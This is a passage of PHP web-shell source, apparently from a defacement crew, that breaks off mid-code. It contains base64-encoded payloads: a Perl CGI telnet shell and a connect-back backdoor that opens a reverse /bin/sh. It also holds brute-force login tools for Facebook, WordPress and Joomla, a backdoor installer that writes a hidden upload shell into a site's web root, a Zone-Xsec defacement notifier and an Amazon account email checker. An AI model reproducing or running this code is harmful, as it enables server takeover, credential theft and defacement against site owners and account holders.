kaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsKCX0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50Cgl7CgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpCgkJewoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsKCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307CgkJCWNsb3NlKFVQTE9BREZJTEUpOwoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7CgkJCXByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCXByaW50ICJGYWlsZWQ6ICQhPGJyPiI7CgkJfQoJfQoJcHJpbnQgIjwvY29kZT4iOwoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsKIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRG93bmxvYWRGaWxlCnsKCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KJlJlYWRQYXJzZTsKJkdldENvb2tpZXM7CgokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9OwokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307CiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307CiRSdW5Db21tYW5kID0gJGlueydjJ307CiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsKJE9wdGlvbnMgPSAkaW57J28nfTsKCiRBY3Rpb24gPSAkaW57J2EnfTsKJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAkaW57J2QnfTsKY2hvcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOwoKJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOwoKaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4KewoJJlBlcmZvcm1Mb2dpbjsKfQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQKewoJJkV4ZWN1dGVDb21tYW5kOwp9CmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CgkmRG93bmxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0K';

$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
    chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';

$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
    chmod("dc.pl",0755);
   echo "<iframe src=cgitelnet1/izo.cin width=96% height=90% frameborder=0></iframe> 

 
 </div>"; 
}
if($_GET['do'] == 'fbbrute') {
error_reporting(0);

$user = $_POST['tguser'];

echo '<center>';

if(isset($_POST['startbf']) && !empty($user) && $_FILES['netfile']['size'] !== 0){
$textkskc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123457890';
$panj = 15;
$txtl = strlen($textkskc)-1;
$uploadz = '';
for($i=1; $i<=$panj; $i++){
$uploadz .= $textkskc[rand(0, $txtl)];
}
if(move_uploaded_file($_FILES['netfile']['tmp_name'], $uploadz)){
$passlists = file_get_contents($uploadz);
unlink($uploadz);
}else{
$passlists = '';
}
$listspass = explode("\n", $passlists);
if(isset($_POST['brift'])){
foreach($listspass as $pass){
if(logfb(urlencode($user), urlencode($pass))){
echo '<font color="lime">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="green">True</font><br/>'."\n";
break;
}else{
echo '<font color="lime">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="red">False</font><br/>'."\n";
}
}
}else{
foreach($listspass as $pass){
if(logfb(urlencode($user), urlencode($pass))){
echo '<font color="lime">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="green">True</font><br/>'."\n";
}else{
echo '<font color="lime">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="red">False</font><br/>'."\n";
}
}
}
}else{
echo '<form method="post" enctype="multipart/form-data">
<b><font size="6" color="red"><--! Facebook Brute Force !--></font></b><br/><br/>
<b>Target Username</b><br/>
<input type="text" size="40" name="tguser" placeholder="Target Username" value="'.htmlspecialchars($user).'"><br/><br/>
<b>Password Lists</b><br/>
<input type="file" name="netfile"><br/>
<input type="checkbox" name="brift" value="Break If True"><font color="red">Break If True</font><br/><br/>
<input type="submit" class="inputz" name="startbf" value="START">
</form>
';
}

echo '</center>
</body>';

function logfb($login_email, $login_pass){
$cookielog = 'gsh_cookie';
$fp = fopen($cookielog, 'w');
fwrite($fp, '');
fclose($fp);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$login_email.'&pass='.$login_pass.'&login=Login');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookielog);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookielog);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3');
curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
$page = curl_exec($ch) or die('<font color="red">Can\'t Connect to Host</font>');
if(eregi('<title>Facebook</title>', $page) || eregi('id="checkpointSubmitButton"', $page)){
return TRUE;
}else{
return FALSE;
}
}
}
if($_GET['do'] == 'zonex') {
echo '<center>';
echo '<br>';
echo '<h1><--! Zone-Xsec <font color=red>Notifier !--></font></h1>';
echo '<br>';
echo '<form method="post" action="" enctype="multipart/form-data">
<b>Nickname :</b><br>
<input class="inputz" size="40" height="10" type="text" name="hekel" value="M4DI~UciH4">
<br><b>Team Name :</b><br>
<input class="inputz" size="40" height="10" type="text" name="crew" value="No team">
<br><b>List Site :</b><br>
<textarea cols="40" rows="10" placeholder="http://site.com/" name="sites"></textarea>
<br>
<br>
<input  class="inputz" type="submit"  name="go" value="hajarr.!">';
echo '</form>';
echo '</center>';
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$crew = $_POST['crew'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://zone-xsec.com/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$crew";
$data_to_post['poc'] = 'Not available';
$data_to_post['reason'] = 'Not available';
$data_to_post['urls'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13'); SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}
if($_GET['do'] == 'wbrute') {
 ?>
<body>
    <div style="text-align: center;">
        <h1><font color="red"><--! Wordpress Brute Forcer !--></font></h1>
        <form method="POST">
        <b>Username :</b><br>
            <input type="text" size="30" height="10" name="username" placeholder=" Username" class="inputz" /> <br /><br />
        <b>Target :</b><br>
            <input type="text" size="30" height="10" name="url" placeholder="Url" class="inputz"/><br /><br />
        <b>Password List :</b><br>
            <textarea cols="40" rows="13" name="passlist" placeholder="PassWord List"></textarea> <br />
            <input type="submit" name="submit" class="inputz" value="Hajar!!!"/>
        </form>
    </div>
    </body>
</html>
<?php
}
set_time_limit(0);
ignore_user_abort(true);
if(isset($_POST['submit'])){
$log = $_POST['username'];
$pwd = explode("\n" , $_POST['passlist']);
$wp_login = $_POST['url'];
$cookie="cookie.txt";
function check($log , $pwd , $wp_login , $cookie){
	$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_URL, $wp_login); 
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY); 
	curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt'); 
	curl_setopt($ch, CURLOPT_HEADER , 1); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'log=' . $log . '&pwd=' . $pwd . '&redirect_to=wp-admin/&rememberme=forever&testcookie=1');
	ob_start(); 
	$response = curl_exec ($ch); 
	ob_end_clean(); 
	curl_close ($ch); 
	unset($ch); 
    $GLOBALS['f'] = 0;
	if(preg_match("/wordpress_logged_in/" , $response)){
	    echo "Found : <a href='Founds.txt' target='_blank' > Click </a>";
		$str = "\r\n\r\nUserName : $log \r\nPassword : $pwd \r\nUrl : $wp_login \r\n\r\n===================================";
        $file = fopen("Founds.txt" , "a+");
        fwrite($file , $str);
        fclose($file);
        $GLOBALS['f']++;
	}


}
foreach($pwd as $pwds){
	check($log , $pwds , $wp_login , $cookie);
}
if($f===0){
    echo "Not found !";
}
}
if($_GET['do'] == 'jbrute') {
 ?>
<center>
<h1><font color='red'><--! Joomla Brute Force !--></font></h1>
<form method='POST'>
<b>Target :</b><br>
<input type='text' name='target' placeholder='http://site/joomla/administrator/index.php' size='38'><br>
<b>Username :</b><br>
<input type='text' name='username' placeholder='username' size='38'><br>
<b>Password list :</b><br><textarea rows='16' cols='38' name='password' placeholder='password'></textarea><br>
<input type='submit' value='Start Brute' name='brute'><br>
</center>
<?php
        @set_time_limit(0);
        $site = $_POST['target'];
        $username = $_POST['username'];
        $passwords = explode("\r\n", $_POST['password']);
 
        function token($site)
        {
                $curl = curl_init();
                curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
                curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
                curl_setopt($curl,CURLOPT_URL, $site);
                @curl_setopt($curl,CURLOPT_COOKIEJAR, getcwd()."./cookie.txt");
                @curl_setopt($curl,CURLOPT_COOKIEFILE, getcwd()."./cookie.txt");
                $get = curl_exec($curl);
                preg_match('/<input type="hidden" name="(.*?)" value="1"/', $get, $token);
                return $token[1];
        }
        $hash = token($site);
        function brute($site,$username,$password,$hash)
        {
                $curl = curl_init();
                curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
                curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
                curl_setopt($curl,CURLOPT_URL, $site);
                curl_setopt($curl,CURLOPT_POSTFIELDS,"username={$username}&passwd={$password}&lang=&option=com_login&task=login&return=aW5kZXgucGhw&{$hash}=1");
                @curl_setopt($curl,CURLOPT_COOKIEJAR, getcwd()."./cookie.txt");
                @curl_setopt($curl,CURLOPT_COOKIEFILE, getcwd()."./cookie.txt");
                $brute = curl_exec($curl);
                if(eregi("Logout" , $brute))
                {
                        echo "<center><font face='Tahoma' size='2'>[+] Cracked Username : <font color='lime'><b>{$username}</b></font> & Password : <font color='lime'><b>{$password}</b></font></font></center>";
                }
                return $brute;
        }
        foreach($passwords as $password)
        {
                brute($site,$username,$password,$hash);
        }
        @system("del cookie.txt"); # On Windows
        @system("rm cookie.txt"); # On Linux
}
if($_GET['do'] == 'backdoor') {
 ?>
 <center>
<h1><font color="red">Backdoor Installer M4DI~UciH4</font></h1>
<form method="post" action="">
    <b><font color="red">Nama File :</b></font><input type="text" placeholder="backdoor.php" name="jeneng" style="width:300px" >
    <input type="submit" name="ok" value="Simpan"><br><br>
    <b><font color="red">NB : Setelah selesai membuat backdoor check file mu dan tambahkan ?cx=shell contoh : test.php?cx=shell</b></font><br>
</center>
<?php
}
if(isset($_POST['ok'])){
    if(empty($_POST['jeneng'])) {
        echo "Isi dulu gblok!!!";
    }else{
        $door= $_POST['jeneng'];
        $data= base64_decode("PD9waHANCi8vIGhpZGVuIHNoZWxsIHVwbG9hZA0KLy8gYWtzZXMgZmlsZS5waHA/Y3g9c2hlbGwNCiBlcnJvcl9yZXBvcnRpbmcoMCk7DQogJGNtZCAgPSAkX0dFVFsnY3gnXTsNCiAkcG9zdCAgPSAkX1BPU1RbInVwbG9hZCJdOw0KICR0YXJnZXRfZmlsZT0gYmFzZW5hbWUoJF9GSUxFU1sibV91cGxvYWQiXVsibmFtZSJdKTsNCiBpZigkY21kPT0nc2hlbGwnKQ0KIHsNCj8+DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPkN5dG9YcGxvaXQgQmFja2Rvb3I8L3RpdGxlPg0KPG1ldGEgbmFtZT0nYXV0aG9yJyBjb250ZW50PScweDE5OTknPg0KPG1ldGEgY2hhcnNldD0iVVRGLTgiPg0KPHN0eWxlIHR5cGU9J3RleHQvY3NzJz4NCkBpbXBvcnQgdXJsKGh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1BYmVsKTsNCmh0bWwgew0KCWJhY2tncm91bmQ6ICMwMDAwMDA7DQoJY29sb3I6ICNmZmZmZmY7DQoJZm9udC1mYW1pbHk6ICdBYmVsJzsNCglmb250LXNpemU6IDEzcHg7DQoJd2lkdGg6IDEwMCU7DQp9DQo8L3N0eWxlPg0KPGNlbnRlcj4NCjxoZWFkZXI+ICAgDQo8cHJlIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXIiPjxmb250IGNvbG9yPSJyZWQiPiANCiANCiDilojilojilojilojilojilojigIHilojilojigIEgICDilojilojigIHilojilojilojilojilojilojilojilojigIEg4paI4paI4paI4paI4paI4paI4oCBIOKWiOKWiOKAgSAg4paI4paI4oCB4paI4paI4paI4paI4paI4paI4oCBIOKWiOKWiOKAgSAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKAgSDilojilojigIHilojilojilojilojilojilojilojilojigIENCuKWiOKWiOKAgeKAgeKAgeKAgeKAgeKAgeKAgeKWiOKWiOKAgSDilojilojigIHigIHigIHigIHigIHilojilojigIHigIHigIHigIHilojilojigIHigIHigIHigIHilojilojigIHigIHilojilojigIHilojilojigIHigIHilojilojigIHigIHigIHilojilojigIHilojilojigIEgICAgIOKWiOKWiOKAgeKAgeKAgeKAgeKWiOKWiOKAgeKWiOKWiOKAgeKAgeKAgeKAgeKWiOKWiOKAgeKAgeKAgeKAgQ0K4paI4paI4oCBICAgICAg4oCB4paI4paI4paI4paI4oCB4oCBICAgIOKWiOKWiOKAgSAgIOKWiOKWiOKAgSAgIOKWiOKWiOKAgSDigIHilojilojilojigIHigIEg4paI4paI4paI4paI4paI4paI4oCB4oCB4paI4paI4oCBICAgICDilojilojigIEgICDilojilojigIHilojilojigIEgICDilojilojigIEgICANCuKWiOKWiOKAgSAgICAgICDigIHilojilojigIHigIEgICAgIOKWiOKWiOKAgSAgIOKWiOKWiOKAgSAgIOKWiOKWiOKAgSDilojilojigIHilojilojigIEg4paI4paI4oCB4oCB4oCB4oCB4oCBIOKWiOKWiOKAgSAgICAg4paI4paI4oCBICAg4paI4paI4oCB4paI4paI4oCBICAg4paI4paI4oCBICAgDQrigIHilojilojilojilojilojilojigIEgICDilojilojigIEgICAgICDilojilojigIEgICDigIHilojilojilojilojilojilojigIHigIHilojilojigIHigIEg4paI4paI4oCB4paI4paI4oCBICAgICDilojilojilojilojilojilojilojigIHigIHilojilojilojilojilojilojigIHigIHilojilojigIEgICDilojilojigIEgICANCiDigIHigIHigIHigIHigIHigIHigIEgICDigIHigIHigIEgICAgICDigIHigIHigIEgICAg4oCB4oCB4oCB4oCB4oCB4oCB4oCBIOKAgeKAgeKAgSAg4oCB4oCB4oCB4oCB4oCB4oCBICAgICDigIHigIHigIHigIHigIHigIHigIHigIEg4oCB4oCB4oCB4oCB4oCB4oCB4oCBIOKAgeKAgeKAgSAgIOKAgeKAgeKAgSAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KPC9wcmU+PC9oZWFkZXI+PC9oZWFkPjwvaHRtbD4gDQo8P3BocA0KICBlY2hvICI8Zm9ybSBhY3Rpb249JycgbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4NCiI7DQogIGVjaG8gIjxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdtX3VwbG9hZCc+IjsNCiAgZWNobyAiPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndXBsb2FkJyB2YWx1ZT0nVXBsb2FkJz4iOw0KICBlY2hvICI8L2Zvcm0+DQoiOw0KICBlY2hvICI8L2NlbnRlcj4NCiI7DQogfQ0KIA0KIGlmKGlzc2V0KCRfUE9TVFsidXBsb2FkIl0pKQ0KICB7DQogICBpZihtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1sibV91cGxvYWQiXVsidG1wX25hbWUiXSwgJHRhcmdldF9maWxlKSkNCiAgew0KICAgZWNobyAiPGNlbnRlcj4NClVwbG9hZCBTdWNjZXNzZnVsbHk8L2NlbnRlcj4NCiI7DQogICBoZWFkZXIoImxvY2F0aW9uOiR0YXJnZXRfZmlsZSIpOw0KIH0NCn0NCnBocGluZm8oKTsgDQo/Pg==");
        $rootPath = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR;
        $buka=fopen("$rootPath/$door",'w');
        $crot=fwrite($buka,"$data");
        fclose($buka);
        $link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] ."/$door";
        if($crot) {
        if(file_exists($rootPath."$door")) {
        echo "<br><center><a href='$link'><font color='lime'>Check Sini</a></font></center>";
        } else {
        echo "<br><center><font color='red'>Gabisa om</a></font><center>";
        }
    }
}
        echo $do;
}
if($_GET['do'] == 'macheck') {
@set_time_limit(0);
        function curl_($mail){
                $ch = curl_init(); 
                curl_setopt($ch, CURLOPT_URL, "https://www.amazon.com/ap/register?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dgno_newcust?&email=".$mail); 
                curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36");
                curl_setopt($ch, CURLOPT_REFERER, "https://www.amazon.com/"); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 3);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
                $result = curl_exec($ch); 
                return $result;
                curl_close($ch);
        }
?>

<html>
        <body>
        
                <div style="width:950px; margin:0 auto; background-color:black;">
                        <div align="center">
                                <h1><font color="red">AMAZON Email Checker</font></h1>
                                <form method="POST" name="praga" action="">
                                        <textarea cols="80" rows="15" id="text" name="mail"><?php if(isset($_POST['mail'])){ echo $_POST['mail']; } ?></textarea><br>
                                        <input type="submit" value="Check!!" name="sub" />
                                </form>
                        </div>
                </div>

        <?php
                if(isset($_POST['sub'])){
                        $email_list=$_POST['mail'];
                        $line = explode("\r\n",$email_list);
                        $line = array_unique($line);
                        $j=0;$k=0;$o=0;
                        for($i=0;$i<count($line);$i++){
                                if (filter_var($line[$i], FILTER_VALIDATE_EMAIL)) {
                                    $rez=curl_($line[$i]);
                                        echo "<font color='green'> valide ==> </font>".$line[$i]."...";
                                                
                                                if (strpos($rez,'You indicated you are a new customer' ) ){ 
                                                echo "<font color='green'> Ok . <br> </font>";
                                                $live[$j]=$line[$i];
                                                $j++;
                                        }elseif(strpos($rez,'Create account' ) ){
                                                echo "<font color='red'> Noo . <br> </font>";
                                                $die[$o]=$line[$i];
                                                $o++;
                                        }else{
                                                echo "<font color='red'> CanT Check !! . <br> </font>";
                                                $die[$o]=$line[$i];
                                                $o++;
                                        }
                                }else{
                                echo "<font color='red'> Invalide mail </font>=>".$line[$i]."<br>";
                                $not[$k]=$line[$i];
                                $k++;
                                }
                        flush(); ob_flush();
                        
                        
                        }
                ?>
                <table border="0" width="100%">
                        <tr>
                        <td align='center' style="color:green"> AMAZON emails (<?php echo @count($live);?>)</td>
                        <td align='center' style="color:red"> Not AMAZON Eamils (<?php echo @count($die);?>)</td>
                        <td align='center' style="color:orange"> Invalid emails (<?php echo @count($not);?>)</td>
                        </tr>
                <?php
                if(isset($live)){ echo "<tr><td align='center' ><textarea cols='43' rows='10'>";for($i=0;$i<count($live);$i++){echo $live[$i]."\n"; } echo "</textarea></td>";}
                if(isset($die)){ echo "<td align='center' ><textarea cols='43' rows='10'>";for($i=0;$i<count($die);$i++){echo $die[$i]."\n"; } echo "</textarea></td>";}else{echo "<td align='center' ><textarea cols='43' rows='10'></textarea>"; }
